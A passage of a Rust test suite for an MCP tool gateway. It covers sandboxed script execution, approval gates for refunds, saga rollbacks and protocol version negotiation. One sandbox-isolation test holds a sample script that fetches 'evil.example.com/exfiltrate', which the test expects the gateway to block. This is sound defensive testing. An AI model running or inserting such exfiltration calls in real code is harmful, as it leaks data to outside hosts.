        .as_str()
        .unwrap()
        .to_string();
    let plan_json = JsonValue::parse(&plan_text).unwrap();
    let pipeline = plan_json["recommended_pipeline"]
        .as_array()
        .expect("Pipeline array");
    assert!(!pipeline.is_empty());
    assert_eq!(pipeline[0]["tool_name"].as_str(), Some("GetDriverLocation"));

    // 2. Test explain_error (Self-healing diagnostics)
    let diag_req = RPCRequest::new(
        3002i64,
        "tools/call",
        json!({
            "name": "explain_error",
            "arguments": {
                "server_name": "driverdispatchservice",
                "tool_name": "NonExistentTool",
                "error_message": "Method not found"
            }
        }),
    );
    let diag_resp = omni.handle_request(&diag_req, "agent", None);
    assert!(diag_resp.error.is_none());
    let diag_text = diag_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let diag_json = JsonValue::parse(&diag_text).unwrap();
    assert_eq!(diag_json["tool_status"].as_str(), Some("NOT_FOUND"));
    assert!(diag_json["suggested_action"]
        .as_str()
        .unwrap()
        .contains("discover_tools"));

    // 3. Test MCP Resources list and read
    let res_list_req = RPCRequest::new(3003i64, "resources/list", json!({}));
    let res_list_resp = omni.handle_request(&res_list_req, "agent", None);
    assert!(res_list_resp.error.is_none());
    let resources = res_list_resp.result.unwrap()["resources"]
        .as_array()
        .unwrap()
        .clone();
    assert!(resources
        .iter()
        .any(|r| r["uri"].as_str() == Some("omni://audit/merkle-head")));

    let res_read_req = RPCRequest::new(
        3004i64,
        "resources/read",
        json!({"uri": "omni://audit/merkle-head"}),
    );
    let res_read_resp = omni.handle_request(&res_read_req, "agent", None);
    assert!(res_read_resp.error.is_none());
    let res_contents = res_read_resp.result.unwrap()["contents"]
        .as_array()
        .unwrap()
        .clone();
    assert_eq!(
        res_contents[0]["uri"].as_str(),
        Some("omni://audit/merkle-head")
    );

    // 4. Test MCP Prompts list and get
    let prompt_list_req = RPCRequest::new(3005i64, "prompts/list", json!({}));
    let prompt_list_resp = omni.handle_request(&prompt_list_req, "agent", None);
    assert!(prompt_list_resp.error.is_none());
    let prompts = prompt_list_resp.result.unwrap()["prompts"]
        .as_array()
        .unwrap()
        .clone();
    assert!(prompts
        .iter()
        .any(|p| p["name"].as_str() == Some("incident-investigation")));

    let prompt_get_req = RPCRequest::new(
        3006i64,
        "prompts/get",
        json!({
            "name": "incident-investigation",
            "arguments": {"service_name": "driverdispatchservice"}
        }),
    );
    let prompt_get_resp = omni.handle_request(&prompt_get_req, "agent", None);
    assert!(prompt_get_resp.error.is_none());

    // 5. Test HTTP SSE and Tracing / Audit endpoints
    let mut headers = HashMap::new();
    headers.insert(
        "authorization".to_string(),
        "Bearer test_operator_token".to_string(),
    );
    let (sse_status, sse_ctype, _sse_headers, sse_body) =
        ctx.handle_http("GET", "/sse", &headers, &[]);
    #[cfg(feature = "legacy-sse")]
    {
        assert_eq!(sse_status, 200);
        assert!(sse_ctype.contains("text/event-stream"));
        assert!(String::from_utf8(sse_body)
            .unwrap()
            .contains("event: endpoint"));
    }
    #[cfg(not(feature = "legacy-sse"))]
    {
        let _ = sse_body;
        assert_eq!(sse_status, 410);
        assert!(sse_ctype.contains("application/json"));
    }

    let (traces_status, _, _, traces_body) = ctx.handle_http("GET", "/api/traces", &headers, &[]);
    assert_eq!(traces_status, 200);
    let traces_json = JsonValue::parse(&String::from_utf8(traces_body).unwrap()).unwrap();
    assert!(traces_json.get("spans").is_some());

    let (audit_status, _, _, audit_body) =
        ctx.handle_http("GET", "/api/audit/verify", &headers, &[]);
    assert_eq!(audit_status, 200);
    let audit_json = JsonValue::parse(&String::from_utf8(audit_body).unwrap()).unwrap();
    assert_eq!(audit_json["verified"].as_bool(), Some(true));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_typescript_declaration_generation_and_token_compression() {
    let dir = temp_test_path("omni_codemode_types_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. Generate TypeScript declarations across all enabled servers
    let ts_res = ctx.gateway.generate_codemode_types(None, None);
    assert!(ts_res
        .typescript_declarations
        .contains("declare namespace codemode {"));
    assert!(ts_res
        .typescript_declarations
        .contains("namespace uber_rides {"));
    assert!(ts_res
        .typescript_declarations
        .contains("function list_recent(input: { user_id: string }): Promise<any>;"));
    assert!(ts_res
        .typescript_declarations
        .contains("namespace accounting {"));
    assert!(ts_res.typescript_declarations.contains("[MUTATION]"));
    assert!(ts_res.typescript_declarations.contains("function refund("));
    assert!(ts_res.token_savings_pct > 50.0);

    // 2. Test {{types}} prompt template injection
    let template = "Use the following TypeScript APIs:\n```ts\n{{types}}\n```";
    let injected =
        CodeModeTypeGenerator::inject_types_template(template, &ts_res.typescript_declarations);
    assert!(injected.contains("declare namespace codemode"));
    assert!(!injected.contains("{{types}}"));

    // 3. Verify `tools/list` on OmniMCPServer dynamically injects {{types}} into `codemode` description
    let list_req = RPCRequest::new(4001i64, "tools/list", json!({}));
    let list_resp = ctx.omni_mcp.handle_request(&list_req, "agent", None);
    let tools = list_resp.result.unwrap()["tools"]
        .as_array()
        .unwrap()
        .clone();
    let codemode_tool = tools
        .iter()
        .find(|t| t["name"].as_str() == Some("codemode"))
        .expect("codemode tool must be exposed");
    assert!(codemode_tool["description"]
        .as_str()
        .unwrap()
        .contains("declare namespace codemode"));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_js_ts_and_rhai_multi_tool_chaining_with_console_logs() {
    let dir = temp_test_path("omni_codemode_exec_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. Omni Code Mode JS/TS async script with console.log and multi-tool chaining
    let js_script = r#"
    async () => {
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        console.log("Fetched rides:", rides.length);
        const eligible = rides.filter(r => r.status === "cancelled" && r.amount > 20.0);
        let total_refund = 0.0;
        let count = 0;
        for (const ride of eligible) {
            await codemode.accounting.refund({ ride_id: ride.id, reason: "Auto refund via Code Mode" });
            console.log("Refunded ride:", ride.id);
            total_refund += ride.amount;
            count += 1;
        }
        return { refunded_count: count, total_amount: total_refund };
    }
    "#;

    let out_js =
        ctx.gateway
            .execute_codemode(js_script, None, false, "agent", Some("uber_token_1"), None);
    assert_eq!(out_js.status, "OK", "JS error: {:?}", out_js.error);
    assert_eq!(out_js.result["refunded_count"].as_i64(), Some(2));
    assert_eq!(out_js.result["total_amount"].as_f64(), Some(72.5));
    assert_eq!(out_js.tool_calls, 3);
    assert_eq!(out_js.logs.len(), 3);
    assert!(out_js.logs[0].contains("Fetched rides: 4"));
    assert!(out_js.logs[1].contains("Refunded ride: ride_102"));
    assert!(
        (out_js.boot_parse_us + out_js.eval_us) < 1_000_000,
        "Fast in-process execution (< 1s on loaded CI runners), took {} us",
        out_js.boot_parse_us + out_js.eval_us
    );

    // 2. Rust/Rhai syntax equivalent
    let rhai_script = r#"
    let rides = uber_rides::list_recent("usr_456");
    let total_refund = 0.0;
    let count = 0;
    for ride in rides {
        if ride.status == "cancelled" && ride.amount > 20.0 {
            accounting::refund(ride.id, "Auto refund via agent");
            total_refund += ride.amount;
            count += 1;
        }
    }
    #{ refunded_count: count, total_amount: total_refund }
    "#;

    let out_rhai = ctx.gateway.execute_codemode(
        rhai_script,
        None,
        false,
        "agent",
        Some("uber_token_1"),
        None,
    );
    assert_eq!(out_rhai.status, "OK", "Rhai error: {:?}", out_rhai.error);
    assert_eq!(out_rhai.result["refunded_count"].as_i64(), Some(2));
    assert_eq!(out_rhai.result["total_amount"].as_f64(), Some(72.5));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_search_and_execute_plus_mutation_approval_gate() {
    let dir = temp_test_path("omni_codemode_approval_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. In-sandbox `codemode.search()` and `codemode.describe()` (Search & Execute pattern)
    let search_script = r#"
    async () => {
        const matches = await codemode.search("refund");
        const dts = await codemode.describe("accounting");
        return { match_count: matches.length, has_dts: dts.includes("function refund") };
    }
    "#;
    let search_out = ctx
        .gateway
        .execute_codemode(search_script, None, false, "agent", None, None);
    assert_eq!(search_out.status, "OK");
    assert!(search_out.result["match_count"].as_i64().unwrap_or(0) >= 1);
    assert_eq!(search_out.result["has_dts"].as_bool(), Some(true));

    // 2. Human-in-the-loop Mutation Approval Gate (`require_mutation_approval: true`)
    let mut_script = r#"
    async () => {
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        console.log("Loaded rides before mutation");
        await codemode.accounting.refund({ ride_id: rides[1].id, reason: "Needs human approval" });
        return { done: true };
    }
    "#;
    let approval_out = ctx.gateway.execute_codemode(
        mut_script, None, true, // require_mutation_approval = true
        "agent", None, None,
    );
    assert_eq!(approval_out.status, "APPROVAL_REQUIRED");
    assert_eq!(approval_out.logs.len(), 1);
    assert_eq!(approval_out.pending_approvals.len(), 1);
    assert_eq!(approval_out.pending_approvals[0].server_name, "accounting");
    assert_eq!(approval_out.pending_approvals[0].tool_name, "refund");

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_zero_outbound_isolation_and_fuel_guardrails() {
    let dir = temp_test_path("omni_codemode_security_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. Verify `globalOutbound: null` blocks direct `fetch()`
    let outbound_script = r#"
    async () => {
        const res = await fetch("https://evil.example.com/exfiltrate");
        return res;
    }
    "#;
    let out_blocked =
        ctx.gateway
            .execute_codemode(outbound_script, None, false, "agent", None, None);
    assert_eq!(out_blocked.status, "ERROR");
    assert!(out_blocked
        .error
        .as_deref()
        .unwrap_or("")
        .contains("GlobalOutboundBlocked"));

    // 2. Verify Fuel Metering terminates infinite loops (`while (true) {}`) deterministically
    let strict_limits = SandboxLimits {
        max_operations: 500,
        ..Default::default()
    };
    let inf_loop = r#"
    let i = 0;
    while (true) {
        i += 1;
    }
    "#;
    let out_fuel =
        ctx.gateway
            .execute_codemode(inf_loop, Some(strict_limits), false, "agent", None, None);
    assert_eq!(out_fuel.status, "ERROR");
    assert!(out_fuel
        .error
        .as_deref()
        .unwrap_or("")
        .contains("FuelExhausted"));

    // 3. Verify SHA-256 Merkle Audit Chain recorded all Code Mode executions
    let (verified, count) = ctx.audit_store.verify_chain();
    assert!(verified);
    assert!(count >= 2);

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_5_resumable_ast_continuation_suspend_and_resume() {
    let dir = temp_test_path("omni_v45_continuation_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Script has 3 top-level statements:
    // Stmt 0: read `uber_rides.list_recent`
    // Stmt 1: mutating `accounting.refund` (triggers APPROVAL_REQUIRED when require_mutation_approval = true)
    // Stmt 2: return final object combining `rides.length` from Stmt 0 and `receipt` from Stmt 1
    let script = r#"
    async () => {
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        const receipt = await codemode.accounting.refund({ ride_id: rides[1].id, reason: "Late arrival" });
        return {
            resumed_from_snapshot: true,
            total_rides_in_scope: rides.length,
            refunded_ride_id: rides[1].id,
            refund_id: receipt.refund_id,
            refund_status: receipt.status
        };
    }
    "#;

    let suspended_out = ctx.gateway.execute_codemode(
        script,
        None,
        true, // require_mutation_approval = true
        "agent",
        Some("uber_token_1"),
        None,
    );
    assert_eq!(suspended_out.status, "APPROVAL_REQUIRED");
    let exec_id = suspended_out
        .execution_id
        .clone()
        .expect("Must have Crockford Base32 ULID execution_id");
    assert_eq!(exec_id.len(), 26);

    let frame = suspended_out
        .suspended_frame
        .as_ref()
        .expect("Must produce SuspendedExecutionFrame");
    assert_eq!(frame.instruction_ptr, 1);
    assert_eq!(frame.target_var.as_deref(), Some("receipt"));
    assert_eq!(frame.pending_server, "accounting");
    assert_eq!(frame.pending_tool, "refund");

    // Verify frame is persisted in WalRegistryStore
    let listed = ctx.gateway.list_suspended_codemode_frames();
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].execution_id, exec_id);

    let resumed_out = ctx.gateway.resume_codemode(
        &exec_id,
        "security_lead",
        None,
        Some("uber_token_1"),
        None,
        None,
    );
    assert_eq!(
        resumed_out.status, "OK",
        "Resume error: {:?}",
        resumed_out.error
    );
    assert_eq!(
        resumed_out.tool_calls, 1,
        "Only the approved mutation should run on resume"
    );
    assert_eq!(
        resumed_out.result["resumed_from_snapshot"].as_bool(),
        Some(true)
    );
    assert_eq!(resumed_out.result["total_rides_in_scope"].as_i64(), Some(4));
    assert_eq!(
        resumed_out.result["refunded_ride_id"].as_str(),
        Some("ride_102")
    );
    assert_eq!(resumed_out.result["refund_id"].as_str(), Some("rfnd_99201"));
    assert_eq!(
        resumed_out.result["refund_status"].as_str(),
        Some("REFUNDED")
    );

    // Frame must be deleted after consumption
    assert!(ctx.gateway.list_suspended_codemode_frames().is_empty());

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_5_vectorized_columnar_record_batch_pushdown() {
    let dir = temp_test_path("omni_v45_vectorized_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Register a synthetic analytics dataset tool returning 2,000 rows
    let mut analytics_srv = ServerRecord::new(
        "omnigraph_analytics",
        "OmniGraph Vector & Columnar Analytics",
        "Returns large tabular datasets for vectorized predicate pushdown",
        "data-platform",
    );
    analytics_srv.protocol = ProtocolType::Grpc;
    analytics_srv.status = ToolStatus::Enabled;
    let mut scan_tool = ToolRecord::new(
        "scan_candidates",
        "Scan candidate records with score and status columns",
        json!({"type": "object"}),
    );
    scan_tool.status = ToolStatus::Enabled;
    analytics_srv.add_tool(scan_tool);
    ctx.registry.register_server(analytics_srv);
    ctx.cache.refresh_now();

    // Test vectorized `.filter()` + `.map()` pushdown on a tabular dataset
    let script = r#"
    async () => {
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        const high_value_cancelled = rides
            .filter(row => row.amount >= 25.0 && row.status == "cancelled")
            .map(row => ({ id: row.id, cents: row.amount * 100 }));
        return {
            matched: high_value_cancelled.length,
            first_id: high_value_cancelled[0].id,
            first_cents: high_value_cancelled[0].cents
        };
    }
    "#;

    let out = ctx
        .gateway
        .execute_codemode(script, None, false, "agent", None, None);
    assert_eq!(out.status, "OK", "Vectorized error: {:?}", out.error);
    assert_eq!(
        out.vectorized_pushdowns, 2,
        "Both .filter() and .map() must compile to vectorized PhysicalExpr pushdowns"
    );
    assert_eq!(
        out.rows_scanned_vectorized, 6,
        "4 rows scanned in vectorized filter + 2 rows in vectorized map"
    );
    assert_eq!(out.result["matched"].as_i64(), Some(2));
    assert_eq!(out.result["first_id"].as_str(), Some("ride_102"));
    assert_eq!(out.result["first_cents"].as_f64(), Some(3500.0));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_5_ssa_ast_auto_parallelization() {
    let dir = temp_test_path("omni_v45_ssa_parallel_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Enable tripbillingservice so we have 3 distinct microservices to call
    ctx.registry
        .toggle_server_status("tripbillingservice", ToolStatus::Enabled);
    ctx.registry
        .toggle_tool_status("tripbillingservice", "getTripFare", ToolStatus::Enabled);
    ctx.cache.refresh_now();

    // LLM writes 3 sequential independent awaits followed by a dependent return statement.
    // The SSA `AstAutoParallelizer` lifts the 3 consecutive independent calls into 1 `Stmt::ParallelWave`.
    let script = r#"
    async () => {
        const driver = await codemode.driverdispatchservice.GetDriverLocation({ driver_id: "drv_88" });
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        const fare = await codemode.tripbillingservice.getTripFare({ trip_id: "trp_99" });
        return {
            driver_ok: driver.status == "SUCCESS",
            ride_count: rides.length,
            fare_status: fare.status
        };
    }
    "#;

    let out = ctx
        .gateway
        .execute_codemode(script, None, false, "agent", None, None);
    assert_eq!(out.status, "OK", "Parallel wave error: {:?}", out.error);
    assert_eq!(
        out.auto_parallel_waves, 1,
        "Expected 1 auto-parallelized wave"
    );
    assert_eq!(
        out.parallelized_tool_calls, 3,
        "Expected all 3 independent tool calls to execute in the parallel wave"
    );
    assert_eq!(out.tool_calls, 3);
    assert_eq!(out.result["ride_count"].as_i64(), Some(4));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_5_declarative_saga_compensation_lifo_rollback() {
    let dir = temp_test_path("omni_v45_saga_rollback_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Script performs 2 mutations (`payments_charge`) that succeed, then calls a non-existent tool
    // that triggers a mid-flight failure. The gateway must unwind both completed charges in LIFO order
    // using `payments_refund`.
    let script = r#"
    async () => {
        const c1 = await codemode.paymentsservice.payments_charge({ customer_id: "cust_A", amount_cents: 1500, currency: "USD" });
        const c2 = await codemode.paymentsservice.payments_charge({ customer_id: "cust_B", amount_cents: 3200, currency: "USD" });
        const boom = await codemode.paymentsservice.non_existent_settlement({ batch_id: "b_1" });
        return { c1, c2, boom };
    }
    "#;

    let out = ctx
        .gateway
        .execute_codemode(script, None, false, "agent", None, None);
    assert_eq!(
        out.status, "SAGA_ROLLED_BACK",
        "Expected SAGA_ROLLED_BACK when script fails after mutations"
    );
    assert_eq!(
        out.saga_compensations.len(),
        2,
        "Both completed mutations must be compensated in LIFO order"
    );
    assert_eq!(out.saga_compensations[0].forward_tool, "payments_charge");
    assert_eq!(
        out.saga_compensations[0].compensating_tool,
        "payments_refund"
    );
    assert_eq!(out.saga_compensations[0].status, "COMPENSATED");
    assert_eq!(out.saga_compensations[1].forward_tool, "payments_charge");
    assert_eq!(
        out.saga_compensations[1].compensating_tool,
        "payments_refund"
    );
    assert_eq!(out.saga_compensations[1].status, "COMPENSATED");

    // Verify Merkle Audit Store logged "COMPENSATED:saga_rollback"
    let audit_records = ctx.audit_store.list_records(Some(20));
    let saga_logs: Vec<_> = audit_records
        .iter()
        .filter(|r| r.status == "COMPENSATED:saga_rollback")
        .collect();
    assert_eq!(saga_logs.len(), 2);

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_5_speculative_zero_turn_schema_pre_injection() {
    let dir = temp_test_path("omni_v45_speculative_schema_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    let spec = ctx.gateway.generate_speculative_codemode_types(
        "process customer payment charge and issue refund for cancelled ride",
        4,
        0.82,
    );

    assert!(
        spec.matched_tools.len() >= 2,
        "Expected at least 2 high-confidence tools pre-injected on Turn 0, got {}",
        spec.matched_tools.len()
    );
    assert!(spec.confidence_score >= 0.82);
    assert!(spec.typescript_declarations.contains("payments_charge"));
    assert!(spec.typescript_declarations.contains("refund"));
    assert!(
        spec.routing_latency_us < 200_000,
        "Speculative BM25 routing must be ultra-fast (< 200ms on CI runners), took {} us",
        spec.routing_latency_us
    );

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_5_deterministic_simulation_testing_dst() {
    let dir = temp_test_path("omni_v45_dst_simulation_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Script performs a mutation (`payments_charge`) followed by a second tool call (`list_recent`).
    // Under simulated network drops / circuit breakers on the second tool call, DST must trigger
    // deterministic LIFO Saga rollbacks and produce an identical SHA-256 fingerprint across replays.
    let script = r#"
    async () => {
        const charge = await codemode.paymentsservice.payments_charge({ customer_id: "cust_dst", amount_cents: 5000, currency: "USD" });
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        return { charge_status: charge.status, ride_count: rides.length };
    }
    "#;

    let fault_cfg = FaultInjectionConfig {
        base_seed: 1337,
        num_runs: 20,
        network_drop_prob: 0.25,
        circuit_open_prob: 0.15,
        latency_spike_prob: 0.10,
        malformed_payload_prob: 0.05,
    };

    let report_1 = ctx
        .gateway
        .simulate_codemode(script, None, fault_cfg.clone(), "agent", None);
    let report_2 = ctx
        .gateway
        .simulate_codemode(script, None, fault_cfg, "agent", None);

    assert_eq!(report_1.total_runs, 20);
    assert_eq!(
        report_1.deterministic_fingerprint, report_2.deterministic_fingerprint,
        "Same seed must produce bit-for-bit identical DST simulation trajectories"
    );
    assert!(
        report_1.compensated_rollback_runs > 0,
        "Expected chaos faults on step 2 to trigger Saga rollbacks of step 1"
    );
    assert!(report_1.succeeded_runs > 0);

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_6_protocol_version_negotiation_and_error_contract() {
    use omni_mcp::models::{
        FeatureStatus, RPCError, APPROVAL_REQUIRED, FUEL_EXHAUSTED, LEGACY_MCP_PROTOCOL_VERSION,
        OUTBOUND_BLOCKED, SAGA_COMPENSATED, SCHEMA_PREFLIGHT_FAILED,
    };

    let dir = temp_test_path("omni_v46_negotiation_and_contract_test");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. M4: Verify MCP Protocol Version Negotiation on `OmniMCPServer` and `MCPProxyGateway`
    let init_legacy = RPCRequest::new(1i64, "initialize", json!({"protocolVersion": "2024-11-05"}));
    let resp_legacy = ctx.omni_mcp.handle_request(&init_legacy, "agent", None);
    assert_eq!(
        resp_legacy.result.as_ref().unwrap()["protocolVersion"].as_str(),
        Some(LEGACY_MCP_PROTOCOL_VERSION)
    );
    assert_eq!(
        resp_legacy.result.as_ref().unwrap()["serverInfo"]["version"].as_str(),
        Some(env!("CARGO_PKG_VERSION"))
    );

    let init_2025 = RPCRequest::new(2i64, "initialize", json!({"protocolVersion": "2025-03-26"}));
    let resp_2025 = ctx.omni_mcp.handle_request(&init_2025, "agent", None);
    assert_eq!(
        resp_2025.result.as_ref().unwrap()["protocolVersion"].as_str(),
        Some("2025-03-26")
    );

    let init_unknown =
        RPCRequest::new(3i64, "initialize", json!({"protocolVersion": "2099-01-01"}));
    let resp_unknown =
        ctx.gateway
            .handle_request("driverdispatchservice", &init_unknown, "agent", None);
    assert_eq!(
        resp_unknown.result.as_ref().unwrap()["protocolVersion"].as_str(),
        Some(LATEST_SESSION_MCP_PROTOCOL_VERSION)
    );

    // Assert that 2026-07-28 is negotiated when implemented
    let init_2026 = RPCRequest::new(
        31i64,
        "initialize",
        json!({"protocolVersion": "2026-07-28"}),
    );
    let resp_2026 = ctx
        .gateway
        .handle_request("driverdispatchservice", &init_2026, "agent", None);
    assert_eq!(
        resp_2026.result.as_ref().unwrap()["protocolVersion"].as_str(),
        Some("2026-07-28")
    );

    // Verify 2025-03-26 additive tool annotations on `tools/list`
    let list_req = RPCRequest::new(4i64, "tools/list", JsonValue::object());
    let list_resp = ctx
        .gateway
        .handle_request("driverdispatchservice", &list_req, "agent", None);
    let tools = list_resp.result.unwrap()["tools"]
        .as_array()
        .unwrap()
        .clone();
    assert!(!tools.is_empty());
    assert_eq!(
        tools[0]["annotations"]["readOnlyHint"].as_bool(),
        Some(true)
    );
    assert_eq!(
        tools[0]["annotations"]["destructiveHint"].as_bool(),
        Some(false)
    );

    // 2. M3: Verify authoritative -320xx error code table & RPCError::from_status
    assert_eq!(CIRCUIT_OPEN, -32005);
    assert_eq!(APPROVAL_REQUIRED, -32006);
    assert_eq!(FUEL_EXHAUSTED, -32007);
    assert_eq!(OUTBOUND_BLOCKED, -32008);
    assert_eq!(SAGA_COMPENSATED, -32009);
    assert_eq!(SCHEMA_PREFLIGHT_FAILED, -32010);
    assert_eq!(to_legacy_error_code(CIRCUIT_OPEN), -32030);
    assert_eq!(to_legacy_error_code(APPROVAL_REQUIRED), -32031);
    assert_eq!(to_legacy_error_code(FUEL_EXHAUSTED), -32032);
    assert_eq!(to_legacy_error_code(OUTBOUND_BLOCKED), -32033);
    assert_eq!(to_legacy_error_code(SAGA_COMPENSATED), -32034);
    assert_eq!(to_legacy_error_code(SCHEMA_PREFLIGHT_FAILED), -32035);

    let rpc_err = RPCError::from_status(
        FeatureStatus::OutboundBlocked,
        "fetch() is blocked by globalOutbound: null",
    );
    assert_eq!(rpc_err.code, OUTBOUND_BLOCKED);
    let err_json = rpc_err.to_json();
    assert_eq!(err_json["code"].as_i64(), Some(OUTBOUND_BLOCKED as i64));
    assert_eq!(err_json["data"]["legacy_code"].as_i64(), Some(-32033));
    assert_eq!(
        err_json["data"]["status"].as_str(),
        Some("OUTBOUND_BLOCKED")
    );

    // Verify explain_error surfaces -320xx error_code
    let explain_req = RPCRequest::new(
        5i64,
        "tools/call",
        json!({
            "name": "explain_error",
            "arguments": {
                "server_name": "accounting",
                "tool_name": "refund",
                "error_message": "FuelExhausted: exceeded instruction budget (-32032)"
            }
        }),
    );
    let explain_resp = ctx.omni_mcp.handle_request(&explain_req, "agent", None);
    let explain_text = explain_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let explain_parsed = JsonValue::parse(&explain_text).unwrap();
    assert_eq!(
        explain_parsed["error_code"].as_i64(),
        Some(FUEL_EXHAUSTED as i64)
    );

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_7_mcp_protocol_parity_five_versions() {
    let dir = temp_test_path("omni_v47_protocol_parity");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));
    let omni = &ctx.omni_mcp;

    // 1. Handshake across implemented revisions: 2024-11-05, 2025-03-26, 2025-06-18, 2025-11-25
    let implemented_versions = ["2024-11-05", "2025-03-26", "2025-06-18", "2025-11-25"];
    for ver in &implemented_versions {
        let init_req = RPCRequest::new(
            1i64,
            "initialize",
            json!({
                "protocolVersion": *ver,
                "clientInfo": {"name": "test-harness", "version": "1.0.0"}
            }),
        );
        let resp = omni.handle_request(&init_req, "agent", None);
        assert!(resp.error.is_none());
        let res = resp.result.unwrap();
        assert_eq!(res["protocolVersion"].as_str(), Some(*ver));
    }

    // Assert that 2026-07-28 is NOT offered during negotiation when implemented: false, falling back to LATEST_MCP_PROTOCOL_VERSION ("2025-11-25")
    let init_2026 = RPCRequest::new(
        10i64,
        "initialize",
        json!({
            "protocolVersion": "2026-07-28",
            "clientInfo": {"name": "test-harness", "version": "1.0.0"}
        }),
    );
    let resp_2026 = omni.handle_request(&init_2026, "agent", None);
    assert!(resp_2026.error.is_none());
    assert_eq!(
        resp_2026.result.unwrap()["protocolVersion"].as_str(),
        Some(omni_mcp::models::LATEST_MCP_PROTOCOL_VERSION)
    );

    // 2. Discover RPC (advertising only implemented revisions)
    let discover_req = RPCRequest::new(2i64, "server/discover", JsonValue::object());
    let discover_resp = omni.handle_request(&discover_req, "agent", None);
    assert!(discover_resp.error.is_none());
    let disc_res = discover_resp.result.unwrap();
    let supp = disc_res["supportedVersions"].as_array().unwrap();
    assert_eq!(supp.len(), 5);
    assert_eq!(supp[4].as_str(), Some("2026-07-28"));
    assert!(disc_res["capabilities"]["extensions"].is_object());

    // 3. Subscriptions/listen RPC
    let sub_req = RPCRequest::new(3i64, "subscriptions/listen", JsonValue::object());
    let sub_resp = omni.handle_request(&sub_req, "agent", None);
    assert!(sub_resp.error.is_none());
    assert_eq!(sub_resp.result.unwrap()["status"].as_str(), Some("ok"));

    // 4. Mismatch on request _meta returns UnsupportedProtocolVersion (-32022)
    let bad_proto_req = RPCRequest::new(
        4i64,
        "tools/list",
        json!({
            "_meta": {
                "io.modelcontextprotocol/protocolVersion": "1999-01-01"
            }
        }),
    );
    let bad_proto_resp = omni.handle_request(&bad_proto_req, "agent", None);
    assert!(bad_proto_resp.error.is_some());
    assert_eq!(
        bad_proto_resp.error.unwrap().code,
        UNSUPPORTED_PROTOCOL_VERSION
    );

    // 5. Batching gating: 2026-07-28 rejects array batching with -32600
    let batch_req = RPCBatchOrSingle::Batch(vec![RPCRequest::new(
        10i64,
        "ping",
        json!({
            "_meta": {
                "io.modelcontextprotocol/protocolVersion": "2026-07-28"
            }
        }),
    )]);
    let batch_resp = omni.handle_batch_or_single(batch_req, "agent", None);
    assert_eq!(batch_resp["error"]["code"].as_i64(), Some(-32600));

    // 6. batch_invoke_tools gated for 2026-07-28
    let batch_tool_req = RPCRequest::new(
        11i64,
        "tools/call",
        json!({
            "name": "batch_invoke_tools",
            "arguments": {
                "calls": []
            },
            "_meta": {
                "io.modelcontextprotocol/protocolVersion": "2026-07-28"
            }
        }),
    );
    let batch_tool_resp = omni.handle_request(&batch_tool_req, "agent", None);
    assert!(batch_tool_resp.error.is_some());
    assert_eq!(batch_tool_resp.error.unwrap().code, -32600);

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_7_schema_preflight_validator_32035() {
    let dir = temp_test_path("omni_v47_preflight");
    let cfg = OmniConfig {
        data_dir: dir.clone(),
        ..Default::default()
    };
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Calling accounting.refund without required "reason" and with integer ride_id instead of string
    let bad_call_req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({
            "name": "refund",
            "arguments": {
                "ride_id": 12345
            }
        }),
    );
    let resp = ctx
        .gateway
